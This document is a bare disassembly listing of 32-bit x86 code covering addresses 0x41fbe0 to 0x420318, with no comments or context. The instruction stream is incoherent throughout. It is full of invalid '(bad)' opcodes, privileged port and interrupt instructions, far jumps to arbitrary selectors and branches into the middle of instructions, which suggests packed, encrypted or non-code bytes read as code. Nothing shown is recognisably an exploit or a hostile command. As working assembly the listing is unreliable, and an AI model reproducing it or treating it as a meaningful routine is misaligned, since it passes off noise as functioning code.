  41fbe0:	xchg   ecx,eax
  41fbe1:	outs   dx,BYTE PTR ds:[esi]
  41fbe2:	xor    DWORD PTR [ecx],esp
  41fbe4:	adc    eax,0xdfb868ca
  41fbe9:	inc    esi
  41fbea:	test   eax,0x88ea75a
  41fbef:	mov    bh,0xee
  41fbf1:	out    dx,al
  41fbf2:	lea    eax,[esi+0x37]
  41fbf5:	frstor [esi]
  41fbf7:	jle    0x41fb9f
  41fbf9:	pop    ecx
  41fbfa:	jmp    0x41fc24
  41fbfc:	or     eax,0x1ff8476a
  41fc01:	push   ebx
  41fc02:	jmp    DWORD PTR [ecx]
  41fc04:	ins    DWORD PTR es:[edi],dx
  41fc05:	pop    ds
  41fc06:	and    BYTE PTR [eax],dl
  41fc08:	dec    edx
  41fc09:	and    al,0xa8
  41fc0b:	xchg   DWORD PTR [edx+0x1e],ebp
  41fc0e:	sbb    DWORD PTR [edx-0x7],ebp
  41fc11:	inc    eax
  41fc12:	push   ebx
  41fc13:	hlt    
  41fc14:	sbb    eax,0x76d4090d
  41fc19:	jecxz  0x41fc04
  41fc1b:	fdivr  QWORD PTR [eax+0x4bc95d5]
  41fc21:	out    0xd9,eax
  41fc23:	cli    
  41fc24:	ja     0x41fc1b
  41fc26:	nop
  41fc27:	jmp    0x7dac3347
  41fc2c:	or     eax,edx
  41fc2e:	xchg   DWORD PTR [edx+0x63],eax
  41fc31:	jle    0x41fbf6
  41fc33:	xchg   DWORD PTR [eax-0x3a],edx
  41fc36:	call   0x9c90:0x5866dccc
  41fc3d:	imul   ebp,DWORD PTR gs:[edx*4-0x1dec47cf],0x38
  41fc46:	or     BYTE PTR [ebx+0x473c0bd7],ch
  41fc4c:	ret    0x790c
  41fc4f:	pop    ds
  41fc50:	pop    ecx
  41fc51:	cmp    eax,0xc7a82b98
  41fc56:	lods   eax,DWORD PTR ds:[esi]
  41fc57:	scas   al,BYTE PTR es:[edi]
  41fc58:	jmp    0x143c0edf
  41fc5d:	das    
  41fc5e:	loop   0x41fca9
  41fc60:	aam    0x9
  41fc62:	ins    DWORD PTR es:[edi],dx
  41fc63:	sbb    bl,BYTE PTR [ecx]
  41fc65:	std    
  41fc66:	add    al,0x38
  41fc68:	adc    DWORD PTR ss:[ebx],0x72
  41fc6c:	pop    ebx
  41fc6d:	cli    
  41fc6e:	mov    dh,0xd0
  41fc70:	inc    esi
  41fc71:	out    dx,eax
  41fc72:	mov    ds:0xf9479644,eax
  41fc77:	ror    al,0x70
  41fc7a:	mov    ebx,0xae5df280
  41fc7f:	cmc    
  41fc80:	adc    cl,BYTE PTR [edi+ecx*1+0x67]
  41fc84:	outs   dx,DWORD PTR ds:[esi]
  41fc85:	fsubr  st,st(7)
  41fc87:	cld    
  41fc88:	push   esp
  41fc89:	xchg   ebx,eax
  41fc8a:	jo     0x41fc47
  41fc8c:	add    DWORD PTR [eax],edx
  41fc8e:	jmp    0x424dfe1b
  41fc93:	pusha  
  41fc94:	retf   0x1ac2
  41fc97:	test   BYTE PTR [edx],bh
  41fc99:	adc    BYTE PTR [ebx],0x8a
  41fc9c:	ret    0xc690
  41fc9f:	sti    
  41fca0:	dec    ecx
  41fca1:	jbe    0x41fc36
  41fca3:	aad    0xdc
  41fca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fca6:	mov    ebp,0xeabe8294
  41fcab:	dec    edi
  41fcac:	pop    edx
  41fcad:	inc    ebp
  41fcae:	mov    ds:0xf9b3805f,eax
  41fcb3:	scas   eax,DWORD PTR es:[edi]
  41fcb4:	adc    DWORD PTR [eax+eax*8-0x1f],edx
  41fcb8:	adc    DWORD PTR [edx+0x4d490ee9],ebp
  41fcbe:	inc    ebx
  41fcbf:	stos   DWORD PTR es:[edi],eax
  41fcc0:	sub    al,0x9a
  41fcc2:	inc    edx
  41fcc3:	mov    bh,0x75
  41fcc5:	and    bl,BYTE PTR [ecx-0x49]
  41fcc8:	cmp    BYTE PTR [ebp+0x31e512b5],ch
  41fcce:	inc    esi
  41fccf:	ret    0x4595
  41fcd2:	xor    al,0x79
  41fcd4:	pusha  
  41fcd5:	int    0xdd
  41fcd7:	fisubr WORD PTR [edi]
  41fcd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcda:	ficomp WORD PTR [ebx-0x65]
  41fcdd:	pop    edi
  41fcde:	cmp    esi,DWORD PTR [ebx-0x55]
  41fce1:	stos   BYTE PTR es:[edi],al
  41fce2:	jmp    0xab05:0x35264a2f
  41fce9:	mov    bl,0x42
  41fceb:	cmp    edx,DWORD PTR [ebx]
  41fced:	nop
  41fcee:	push   cs
  41fcef:	js     0x41fd28
  41fcf1:	ret    
  41fcf2:	xchg   edx,eax
  41fcf3:	mov    ebx,0x5dbe0fef
  41fcf8:	mov    dh,0x27
  41fcfa:	fdivr  QWORD PTR [ebx+0x72]
  41fcfd:	or     DWORD PTR [edi+0x6c],ebp
  41fd00:	inc    eax
  41fd01:	and    DWORD PTR [ecx+0x69],edx
  41fd04:	mov    dh,0x63
  41fd06:	outs   dx,DWORD PTR ds:[esi]
  41fd07:	(bad)
  41fd0a:	(bad)  
  41fd0e:	jne    0x41fd24
  41fd10:	sub    BYTE PTR [edx-0x39],0xa9
  41fd14:	cmp    al,0x21
  41fd16:	pop    esi
  41fd17:	sub    al,0x64
  41fd19:	das    
  41fd1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd1b:	inc    ecx
  41fd1c:	fidiv  WORD PTR [edi-0x7258c30b]
  41fd22:	cld    
  41fd23:	test   DWORD PTR [eax+0x960ac5a],ecx
  41fd29:	shl    BYTE PTR [edx],1
  41fd2b:	leave  
  41fd2c:	fiadd  WORD PTR [ebp+0x61]
  41fd2f:	jnp    0x41fccb
  41fd31:	push   ds
  41fd32:	add    al,0xa5
  41fd34:	sub    ecx,DWORD PTR [ecx-0x6678a8ac]
  41fd3a:	inc    edx
  41fd3b:	pop    esi
  41fd3c:	ret    
  41fd3d:	mov    al,ds:0x18cf7750
  41fd42:	cmp    al,0xbd
  41fd44:	sbb    eax,0xdbb69d8b
  41fd49:	sbb    DWORD PTR [ebx],esp
  41fd4b:	mov    edx,0x166a0bad
  41fd50:	scas   eax,DWORD PTR es:[edi]
  41fd51:	push   ds
  41fd52:	pop    ebp
  41fd53:	push   cs
  41fd54:	jmp    0xdf374b3b
  41fd59:	loop   0x41fcf6
  41fd5b:	jp     0x41fce7
  41fd5d:	jp     0x41fd58
  41fd5f:	pop    ds
  41fd60:	lock in eax,0xcf
  41fd63:	jb     0x41fd2d
  41fd65:	stos   BYTE PTR es:[edi],al
  41fd66:	adc    DWORD PTR [edx+eiz*4],ecx
  41fd69:	jg     0x41fd1b
  41fd6b:	mov    ch,0x9b
  41fd6d:	mov    ebx,0xe74b2736
  41fd72:	sub    eax,DWORD PTR [eax-0x78]
  41fd75:	sbb    BYTE PTR [ebx],ah
  41fd77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd78:	jp     0x41fd4d
  41fd7a:	ret    
  41fd7b:	mov    ch,0x4c
  41fd7d:	retf   
  41fd7e:	out    0x9a,eax
  41fd80:	mov    ds:0xc5cd37b9,eax
  41fd85:	cmp    edx,0xffffff90
  41fd88:	jo     0x41fd4f
  41fd8a:	jmp    0x41fd5b
  41fd8c:	test   al,0x1a
  41fd8e:	adc    BYTE PTR [esi-0x6aed037f],ch
  41fd94:	xor    DWORD PTR [edi],eax
  41fd96:	ficomp DWORD PTR [eax]
  41fd98:	loopne 0x41fe0c
  41fd9a:	xchg   ebx,eax
  41fd9b:	mov    esp,0xcecfa09d
  41fda0:	fdiv   QWORD PTR [ebx+0x5]
  41fda3:	or     al,0xd3
  41fda5:	sub    BYTE PTR [edi+0x2b],bh
  41fda8:	stc    
  41fda9:	mov    bh,0x44
  41fdab:	retf   0xff73
  41fdae:	jmp    0x41fd74
  41fdb0:	enter  0xbfc9,0x5b
  41fdb4:	xchg   ecx,eax
  41fdb5:	push   ds
  41fdb6:	nop
  41fdb7:	out    dx,eax
  41fdb8:	xor    DWORD PTR [eax+0x4f],esp
  41fdbb:	push   esi
  41fdbc:	sub    ah,dh
  41fdbe:	xor    dl,BYTE PTR [eax-0x36]
  41fdc1:	clc    
  41fdc2:	rol    DWORD PTR [eax-0x451f71bd],cl
  41fdc8:	or     DWORD PTR [edi],0xd153ccae
  41fdce:	xor    eax,0x80cce65c
  41fdd3:	jns    0x41fe3a
  41fdd5:	jo     0x41fe1e
  41fdd7:	mov    ds:0x735798fe,eax
  41fddc:	or     dl,BYTE PTR [eax-0x49]
  41fddf:	dec    ecx
  41fde0:	or     bh,bl
  41fde2:	push   ebp
  41fde3:	xchg   ebx,eax
  41fde4:	call   0x782eb457
  41fde9:	xchg   BYTE PTR [edi+ebx*8+0x66],bh
  41fded:	out    0x3e,al
  41fdef:	push   ecx
  41fdf0:	aam    0x8a
  41fdf2:	int3   
  41fdf3:	pop    ebp
  41fdf4:	and    ch,ah
  41fdf6:	cld    
  41fdf7:	(bad)  
  41fdf8:	push   ecx
  41fdf9:	(bad)  
  41fdfa:	cwde   
  41fdfb:	fsub   st(4),st
  41fdfd:	fst    st(2)
  41fdff:	mov    ah,0x7
  41fe01:	jmp    0x41fe80
  41fe03:	out    dx,eax
  41fe04:	jbe    0x41fe5e
  41fe06:	aad    0x8a
  41fe08:	mov    ch,0xc2
  41fe0a:	test   DWORD PTR [ebp+esi*1-0x39],ebx
  41fe0e:	push   0xffffff8e
  41fe10:	jmp    0x41fe68
  41fe12:	(bad)  
  41fe13:	pop    ds
  41fe14:	pop    es
  41fe15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe16:	ins    DWORD PTR es:[edi],dx
  41fe17:	inc    esi
  41fe18:	clc    
  41fe19:	jg     0x41fdff
  41fe1b:	popa   
  41fe1c:	ins    BYTE PTR es:[edi],dx
  41fe1d:	jae    0x41fdd1
  41fe1f:	xchg   esi,eax
  41fe20:	xor    al,0xea
  41fe22:	cwde   
  41fe23:	pop    edi
  41fe24:	xlat   BYTE PTR ds:[ebx]
  41fe25:	or     eax,0x1409fe45
  41fe2a:	ins    BYTE PTR es:[edi],dx
  41fe2b:	ja     0x41fdfc
  41fe2d:	js     0x41fe1f
  41fe2f:	and    BYTE PTR [ecx+0x3a],ch
  41fe32:	sti    
  41fe33:	mov    edi,0xb0995d5c
  41fe38:	adc    al,0xd6
  41fe3a:	or     al,0x5a
  41fe3c:	sbb    eax,0xdd0d4344
  41fe41:	jg     0x41fe04
  41fe43:	scas   al,BYTE PTR es:[edi]
  41fe44:	add    eax,DWORD PTR [eax-0x47]
  41fe47:	iret   
  41fe48:	and    eax,0x8c3d3dea
  41fe4d:	in     al,0xf0
  41fe4f:	or     al,0xe6
  41fe51:	inc    esp
  41fe52:	mov    esi,0xd11068cc
  41fe57:	scas   eax,DWORD PTR es:[edi]
  41fe58:	(bad)  ds:0xd951b0b7
  41fe5e:	in     eax,0xb4
  41fe60:	pop    edi
  41fe61:	mov    cl,0x9f
  41fe63:	jg     0x41fe56
  41fe65:	inc    ecx
  41fe66:	hlt    
  41fe67:	add    DWORD PTR [ebx+esi*8+0x66],eax
  41fe6b:	jle    0x41fe6e
  41fe6d:	and    BYTE PTR [ecx+ebx*8],bh
  41fe70:	aaa    
  41fe71:	inc    esi
  41fe72:	ja     0x41fea1
  41fe74:	push   edi
  41fe75:	out    0x9a,eax
  41fe77:	stos   BYTE PTR es:[edi],al
  41fe78:	mov    BYTE PTR ds:0x510b2a7f,al
  41fe7e:	sub    DWORD PTR [edx-0x315a27de],ebx
  41fe84:	sub    eax,0x88a07222
  41fe89:	fistp  QWORD PTR [ecx+0x1122c010]
  41fe8f:	jne    0x41feb8
  41fe91:	xchg   DWORD PTR [eax-0x61],esi
  41fe94:	cwde   
  41fe95:	or     eax,0xe8b87496
  41fe9a:	xchg   esp,eax
  41fe9b:	sub    al,0xc4
  41fe9d:	hlt    
  41fe9e:	sbb    BYTE PTR [esi+0x534f2b60],bh
  41fea4:	dec    esi
  41fea5:	outs   dx,DWORD PTR ds:[esi]
  41fea6:	mov    ebx,0x5ce34246
  41feab:	retf   0xe9f0
  41feae:	xchg   esi,eax
  41feaf:	mov    BYTE PTR [eax-0x7bb477ef],bl
  41feb5:	lods   eax,DWORD PTR ds:[esi]
  41feb6:	neg    BYTE PTR [edi+0x31]
  41feb9:	mov    ebx,0xa099a653
  41febe:	ds sub al,0xcf
  41fec1:	hlt    
  41fec2:	adc    DWORD PTR [esi],esi
  41fec4:	jmp    0x50f6:0xcd941f61
  41fecb:	fcomp  QWORD PTR [edi]
  41fecd:	pop    ecx
  41fece:	sub    ch,dl
  41fed0:	fcom   DWORD PTR [esi-0x5556bbb2]
  41fed6:	dec    ebp
  41fed7:	pop    edi
  41fed8:	loope  0x41fede
  41feda:	mov    ds:0x95ffdc66,al
  41fedf:	pop    ds
  41fee0:	jae    0x41feab
  41fee2:	mov    ebx,DWORD PTR ds:0x16229cce
  41fee8:	pop    ds
  41fee9:	lahf   
  41feea:	mov    al,ds:0xf8c24d37
  41feef:	js     0x41ff48
  41fef1:	(bad)  
  41fef2:	jnp    0x41fed3
  41fef4:	std    
  41fef5:	sbb    BYTE PTR [ecx+0x16cb4636],0x78
  41fefc:	enter  0x97ca,0x9b
  41ff00:	imul   ebp
  41ff02:	not    BYTE PTR [ecx]
  41ff04:	sar    DWORD PTR [eax],0x21
  41ff07:	or     DWORD PTR ds:0xa611a999,ebp
  41ff0d:	jne    0x41ff10
  41ff0f:	add    al,0x44
  41ff11:	fsub   QWORD PTR [ecx+0x3fa544cf]
  41ff17:	dec    edi
  41ff18:	push   ebp
  41ff19:	adc    edi,0x60
  41ff1c:	stos   DWORD PTR es:[edi],eax
  41ff1d:	xchg   esi,eax
  41ff1e:	adc    eax,0x53a0e4b7
  41ff23:	in     eax,dx
  41ff24:	adc    dh,BYTE PTR [eax+ecx*2]
  41ff27:	repnz sar BYTE PTR [ebx+eax*4-0x65],0x4a
  41ff2d:	stos   BYTE PTR es:[edi],al
  41ff2e:	xor    cl,BYTE PTR [edi+0x79]
  41ff31:	mov    edx,edx
  41ff33:	inc    ecx
  41ff34:	mov    ds:0x33f41385,eax
  41ff39:	shr    BYTE PTR [edx+0x3],cl
  41ff3c:	pop    ecx
  41ff3d:	div    ecx
  41ff3f:	mov    ecx,DWORD PTR [ebp-0x40]
  41ff42:	or     eax,ecx
  41ff44:	mov    ecx,DWORD PTR [ebp-0x54]
  41ff47:	xor    edx,edx
  41ff49:	div    ecx
  41ff4b:	imul   eax,eax,0x7d53
  41ff51:	jmp    0x420338
  41ff56:	xor    DWORD PTR [ebx],edx
  41ff58:	(bad)  
  41ff59:	in     al,dx
  41ff5a:	scas   eax,DWORD PTR es:[edi]
  41ff5b:	imul   edi,DWORD PTR [ebx-0x57113e5],0xffffffa4
  41ff62:	mov    ds:0x63a48871,eax
  41ff67:	xchg   ebp,eax
  41ff68:	sar    BYTE PTR [esi-0x41413bb6],0x7f
  41ff6f:	stos   BYTE PTR es:[edi],al
  41ff70:	jecxz  0x41ff03
  41ff72:	pusha  
  41ff73:	pop    eax
  41ff74:	outs   dx,BYTE PTR ds:[esi]
  41ff75:	fimul  DWORD PTR [ebx]
  41ff77:	push   ss
  41ff78:	inc    edx
  41ff79:	retf   0x94aa
  41ff7c:	mov    ch,0xae
  41ff7e:	pusha  
  41ff7f:	cs xchg edx,eax
  41ff81:	dec    eax
  41ff82:	mov    al,0x89
  41ff84:	ret    
  41ff85:	mov    bl,0x83
  41ff87:	div    BYTE PTR [eax-0x21aaea95]
  41ff8d:	shl    BYTE PTR [ebx-0x24f85f8d],1
  41ff93:	jb     0x41ff24
  41ff95:	sub    al,0xd7
  41ff97:	scas   eax,DWORD PTR es:[edi]
  41ff98:	icebp  
  41ff99:	cmp    esi,DWORD PTR [esi]
  41ff9b:	shr    BYTE PTR [eax],1
  41ff9d:	mov    ah,0x5b
  41ff9f:	pop    esp
  41ffa0:	adc    eax,0x33212d12
  41ffa5:	pusha  
  41ffa6:	xor    ch,0x4f
  41ffa9:	out    0xf1,al
  41ffab:	in     eax,dx
  41ffac:	ret    
  41ffad:	jae    0x420013
  41ffaf:	in     al,0xa0
  41ffb1:	xchg   ebp,eax
  41ffb2:	xor    al,0xcf
  41ffb4:	sub    ebp,DWORD PTR [esp+ebp*2+0x71aa405c]
  41ffbb:	adc    ah,bl
  41ffbd:	sbb    esp,eax
  41ffbf:	(bad)  
  41ffc0:	xor    bl,cl
  41ffc2:	ins    BYTE PTR es:[edi],dx
  41ffc3:	and    dl,BYTE PTR [esi]
  41ffc5:	jg     0x420037
  41ffc7:	out    0xb2,al
  41ffc9:	and    dl,BYTE PTR [ebp+0x5d]
  41ffcc:	out    dx,eax
  41ffcd:	or     DWORD PTR [edx],esp
  41ffcf:	xchg   DWORD PTR [edx],esi
  41ffd1:	jo     0x41ffbb
  41ffd3:	cmp    cl,BYTE PTR [ecx-0x19]
  41ffd6:	std    
  41ffd7:	inc    esi
  41ffd8:	and    ebx,DWORD PTR gs:[eax]
  41ffdb:	jmp    0x7539:0x60b709c9
  41ffe2:	pop    ecx
  41ffe3:	fs (bad) 
  41ffe5:	call   0xb1579380
  41ffea:	push   eax
  41ffeb:	dec    edx
  41ffec:	mov    esp,0x2f274e24
  41fff1:	mov    dl,BYTE PTR [ecx-0x4a]
  41fff4:	jg     0x420068
  41fff6:	retf   0xb5aa
  41fff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fffa:	adc    DWORD PTR [esi],ecx
  41fffc:	aaa    
  41fffd:	push   0x66
  41ffff:	xor    esp,DWORD PTR [eax-0x13]
  420002:	dec    eax
  420003:	add    eax,0x2835570
  420008:	bound  esi,QWORD PTR [edi+ecx*8]
  42000b:	add    ecx,esi
  42000d:	stc    
  42000e:	not    bl
  420010:	or     eax,DWORD PTR [edx+0x64ed2a72]
  420016:	daa    
  420017:	div    DWORD PTR [edi+edi*8+0x25dc173c]
  42001e:	ins    DWORD PTR es:[edi],dx
  42001f:	inc    ecx
  420020:	mov    ch,0x16
  420022:	xor    DWORD PTR [esi+0x379f0707],ebx
  420028:	ret    0x2a2a
  42002b:	je     0x42006b
  42002d:	sub    cl,BYTE PTR [esi-0x13d38ac2]
  420033:	fldl2e 
  420035:	fdivr  DWORD PTR [edi]
  420037:	int    0x6
  420039:	push   ss
  42003a:	or     al,BYTE PTR ds:0xab4f09f9
  420040:	(bad)  
  420041:	in     al,dx
  420042:	add    BYTE PTR [ecx+0x689b14b8],ah
  420048:	loop   0x42003a
  42004a:	add    al,0x16
  42004c:	fsubr  DWORD PTR [eax-0x77552271]
  420052:	dec    edi
  420053:	retf   
  420054:	shr    BYTE PTR [ecx-0x34d8df54],cl
  42005a:	les    ecx,FWORD PTR [eax-0x2d29ba1d]
  420060:	push   ebx
  420061:	xor    DWORD PTR [esp+edx*8-0x54bfc962],esp
  420068:	aad    0x4
  42006a:	sbb    bh,BYTE PTR [edx+0x3f]
  42006d:	retf   
  42006e:	and    DWORD PTR [ecx+edx*1+0x6e8d9cb9],ebx
  420075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420076:	jmp    FWORD PTR [ebp+eax*4+0x6d]
  42007a:	add    DWORD PTR [eax-0x49],0x5ac51927
  420081:	cwde   
  420082:	je     0x420013
  420084:	retf   0xa83d
  420087:	in     eax,0x19
  420089:	mov    esi,0x484b8927
  42008e:	xchg   ecx,eax
  42008f:	add    al,0xbe
  420091:	aas    
  420092:	inc    ecx
  420093:	jg     0x4200d9
  420095:	and    dl,BYTE PTR [esi+0x6308af9e]
  42009b:	in     al,0xd1
  42009d:	scas   eax,DWORD PTR es:[edi]
  42009e:	inc    edx
  42009f:	retf   0xff86
  4200a2:	sub    dl,ah
  4200a4:	xchg   ecx,eax
  4200a5:	sub    al,0xf6
  4200a7:	repz (bad) 
  4200a9:	(bad)  
  4200aa:	jge    0x42005e
  4200ac:	adc    al,0xd4
  4200ae:	in     al,dx
  4200af:	xor    BYTE PTR ds:0xa52e4448,ah
  4200b5:	jo     0x420127
  4200b7:	mov    al,ds:0x48b5db83
  4200bc:	and    DWORD PTR [eax],edi
  4200be:	or     esp,DWORD PTR ds:0x4cac9951
  4200c4:	inc    eax
  4200c5:	xchg   ebx,eax
  4200c6:	or     dh,BYTE PTR [ebx+0x563d55c8]
  4200cc:	xchg   esi,eax
  4200cd:	dec    edi
  4200ce:	sub    eax,0xec9b3074
  4200d3:	or     DWORD PTR [eax+0x1a],esp
  4200d6:	mov    ecx,0xfc6cd988
  4200db:	cdq    
  4200dc:	xchg   edx,eax
  4200dd:	dec    BYTE PTR [edx-0x11df22e8]
  4200e3:	std    
  4200e4:	pop    ds
  4200e5:	jns    0x4200ca
  4200e7:	dec    esi
  4200e8:	shl    BYTE PTR [ebp+edx*2-0x7d],0xb5
  4200ed:	aas    
  4200ee:	jae    0x42015f
  4200f0:	imul   eax,DWORD PTR [edx-0x18],0xffffffb4
  4200f4:	dec    edi
  4200f5:	jmp    0x1364b011
  4200fa:	xor    BYTE PTR [esi+0x10235e0f],ch
  420100:	xchg   edx,eax
  420101:	pop    es
  420102:	dec    ah
  420104:	mov    eax,ds:0x67c7e859
  420109:	mov    ecx,0xba5d98e0
  42010e:	loope  0x42015a
  420110:	outs   dx,DWORD PTR ds:[esi]
  420111:	push   eax
  420112:	nop
  420113:	ins    DWORD PTR es:[edi],dx
  420114:	jl     0x42016c
  420116:	jecxz  0x4200ea
  420118:	pop    es
  420119:	aas    
  42011a:	xchg   esi,eax
  42011b:	loope  0x420113
  42011d:	les    ebp,FWORD PTR [esi+0x7f81ba98]
  420123:	imul   DWORD PTR [ebp-0x47]
  420126:	mov    esp,0xddca3285
  42012b:	mov    eax,cs
  42012d:	mov    bl,0x6d
  42012f:	mov    ?,WORD PTR [edx-0x766e819c]
  420135:	inc    edi
  420136:	stos   DWORD PTR es:[edi],eax
  420137:	pop    edi
  420138:	popa   
  420139:	pushf  
  42013a:	pop    edx
  42013b:	int    0xf8
  42013d:	lods   eax,DWORD PTR ds:[esi]
  42013e:	push   edi
  42013f:	(bad)  
  420140:	fist   WORD PTR [ecx]
  420142:	mov    bh,0xa6
  420144:	pop    eax
  420145:	lea    eax,[ebx+0x6e]
  420148:	adc    eax,0x8206f6bf
  42014d:	add    al,0x67
  42014f:	add    BYTE PTR [ecx+esi*8-0x57333639],dh
  420156:	shl    BYTE PTR [esi],0xc3
  420159:	jmp    0xe4a17713
  42015e:	inc    ebx
  42015f:	adc    DWORD PTR [ecx+ecx*8+0x27],0x25
  420164:	pop    edx
  420165:	js     0x42019c
  420167:	daa    
  420168:	xor    DWORD PTR [ecx],0x32
  42016b:	jbe    0x420169
  42016d:	call   0x9771:0x4585acd6
  420174:	js     0x42016d
  420176:	pop    ebp
  420177:	ins    BYTE PTR es:[edi],dx
  420178:	out    dx,al
  420179:	aaa    
  42017a:	lahf   
  42017b:	and    esp,DWORD PTR [edi-0x18]
  42017e:	jbe    0x420190
  420180:	daa    
  420181:	sti    
  420182:	adc    dh,al
  420184:	imul   ebx,DWORD PTR [ebp+0x18e0e140],0x10
  42018b:	or     al,0x19
  42018d:	dec    ebx
  42018e:	sub    eax,0x5a2309f4
  420193:	popf   
  420194:	xor    ch,BYTE PTR [ecx+0x2c]
  420197:	inc    edi
  420198:	test   DWORD PTR [esi-0x56],esp
  42019b:	bound  esi,QWORD PTR ds:0xa97e0c9c
  4201a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201a2:	repnz lea eax,[ecx-0x9]
  4201a6:	stc    
  4201a7:	cmp    DWORD PTR [edi-0x662ee7ce],edi
  4201ad:	ret    
  4201ae:	mov    ds:0x7ce2ed35,al
  4201b3:	mov    eax,fs
  4201b5:	aad    0xef
  4201b7:	loope  0x420226
  4201b9:	jb     0x420223
  4201bb:	mov    edi,0x669aa727
  4201c0:	inc    ebp
  4201c1:	xchg   edx,eax
  4201c2:	jns    0x4201dc
  4201c4:	not    DWORD PTR [eax]
  4201c6:	lods   al,BYTE PTR ds:[esi]
  4201c7:	stos   DWORD PTR es:[edi],eax
  4201c8:	dec    edi
  4201c9:	add    ah,ch
  4201cb:	cli    
  4201cc:	mov    edx,0x57a45c7d
  4201d1:	daa    
  4201d2:	mov    edi,0xb9735f26
  4201d7:	nop
  4201d8:	sub    eax,0x437f95b2
  4201dd:	enter  0x773d,0xf0
  4201e1:	xlat   BYTE PTR ds:[ebx]
  4201e2:	mov    cl,0xab
  4201e4:	jge    0x420182
  4201e6:	fs stos DWORD PTR es:[edi],eax
  4201e8:	pop    eax
  4201e9:	jb     0x4201aa
  4201eb:	iret   
  4201ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ed:	push   cs
  4201ee:	pop    esp
  4201ef:	mov    al,0xff
  4201f1:	mov    dl,0x73
  4201f3:	push   cs
  4201f4:	test   al,0x58
  4201f6:	ins    BYTE PTR es:[edi],dx
  4201f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201f8:	lock fimul WORD PTR [esi+0x4c]
  4201fc:	ds hlt 
  4201fe:	in     al,0xd8
  420200:	imul   ebp,DWORD PTR [esi+0x12],0x66
  420204:	fadd   DWORD PTR [edi]
  420206:	fdiv   st,st(4)
  420208:	je     0x42025d
  42020a:	adc    dl,bh
  42020c:	in     al,dx
  42020d:	dec    esp
  42020e:	sbb    BYTE PTR [edi+0x56896599],bh
  420214:	pop    edx
  420215:	sbb    DWORD PTR [edi+0x42],ebp
  420218:	push   edx
  420219:	ins    BYTE PTR es:[edi],dx
  42021a:	dec    edi
  42021b:	scas   eax,DWORD PTR es:[edi]
  42021c:	out    0x47,al
  42021e:	adc    dl,BYTE PTR [esi+0x61]
  420221:	add    al,0xf7
  420223:	xlat   BYTE PTR ds:[ebx]
  420224:	sub    esi,ebx
  420226:	sub    eax,0x96b0d12b
  42022b:	mov    ds:0xe829bda8,eax
  420230:	sub    BYTE PTR [ecx],ch
  420232:	and    esp,0x21
  420235:	sub    al,BYTE PTR [eax+edx*8+0x1145c4b2]
  42023c:	inc    esi
  42023d:	and    bl,BYTE PTR [edi]
  42023f:	into   
  420240:	sti    
  420241:	pusha  
  420242:	loope  0x42028f
  420244:	int3   
  420245:	inc    eax
  420246:	push   esp
  420247:	sub    DWORD PTR [eax],esi
  420249:	add    ch,BYTE PTR [eax+0x1]
  42024c:	inc    edx
  42024d:	aad    0xc2
  42024f:	mov    al,ds:0x20dd4a8c
  420254:	xchg   DWORD PTR [edi-0x43],ecx
  420257:	and    DWORD PTR [esi-0x74],ecx
  42025a:	push   ebx
  42025b:	push   edx
  42025c:	call   0x3733:0xdede
  420262:	js     0x4202b7
  420264:	mov    ds:0x146c6e9d,eax
  420269:	(bad)  
  42026a:	xor    esp,eax
  42026c:	cs sti 
  42026e:	(bad)  
  42026f:	stos   BYTE PTR es:[edi],al
  420270:	ins    DWORD PTR es:[edi],dx
  420271:	jns    0x4202b1
  420273:	sbb    DWORD PTR [esi+edx*4],esp
  420276:	sub    al,0xd9
  420278:	pop    ss
  420279:	xchg   ebx,eax
  42027a:	dec    eax
  42027b:	pop    es
  42027c:	jmp    0x4202e7
  42027e:	mov    bl,0xe8
  420280:	jb     0x42023c
  420282:	sub    al,0x9
  420284:	stos   DWORD PTR es:[edi],eax
  420285:	sub    ecx,DWORD PTR [ecx-0x29c77f81]
  42028b:	mov    bh,0x78
  42028d:	shr    BYTE PTR [eax],0x6
  420290:	pop    edx
  420291:	fbstp  TBYTE PTR [esp+eax*2]
  420294:	imul   edi,DWORD PTR [esp+esi*8-0x5c],0x43671a89
  42029c:	ret    
  42029d:	cmp    DWORD PTR [eax-0x11034bb4],ecx
  4202a3:	dec    esi
  4202a4:	imul   edx,DWORD PTR ds:[eax],0xffffffc1
  4202a8:	sub    DWORD PTR [ecx-0x6e6b652d],esi
  4202ae:	mov    ds:0xb6bf48fb,eax
  4202b3:	(bad)  
  4202b4:	mov    ecx,edx
  4202b6:	lods   al,BYTE PTR ds:[esi]
  4202b7:	and    al,0x1
  4202b9:	shr    BYTE PTR [ecx+0x38],cl
  4202bc:	stc    
  4202bd:	mov    ecx,0x3ac57775
  4202c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202c3:	cmp    ebp,DWORD PTR [edi-0x5b]
  4202c6:	jecxz  0x420302
  4202c8:	cwde   
  4202c9:	and    eax,eax
  4202cb:	pop    esi
  4202cc:	leave  
  4202cd:	sub    eax,0x8c288615
  4202d2:	jle    0x4202b6
  4202d4:	cli    
  4202d5:	(bad)  [eax+0x78d61f82]
  4202db:	adc    al,0x17
  4202dd:	sar    DWORD PTR [ebp+0x5c],1
  4202e0:	in     al,dx
  4202e1:	aam    0x94
  4202e3:	inc    edx
  4202e4:	mov    DWORD PTR [ebx+esi*1],eax
  4202e7:	sbb    al,0x96
  4202e9:	cmp    al,BYTE PTR [eax]
  4202eb:	dec    ebp
  4202ec:	and    dl,dh
  4202ee:	mov    WORD PTR [esi+0x172ea4cf],?
  4202f4:	or     dh,BYTE PTR [eax+edx*8]
  4202f7:	inc    ecx
  4202f8:	jmp    0x3f9bffbb
  4202fd:	and    eax,DWORD PTR [eax]
  4202ff:	clc    
  420300:	shr    BYTE PTR [eax],0x3f
  420303:	test   al,0xf8
  420305:	inc    esi
  420306:	inc    esi
  420307:	xor    BYTE PTR [ecx-0x7560b25a],0x20
  42030e:	ja     0x42037f
  420310:	push   edx
  420311:	inc    ebx
  420312:	push   edx
  420313:	add    esi,edx
  420315:	outs   dx,BYTE PTR ds:[esi]
  420316:	add    al,0xd2
  420318:	nop
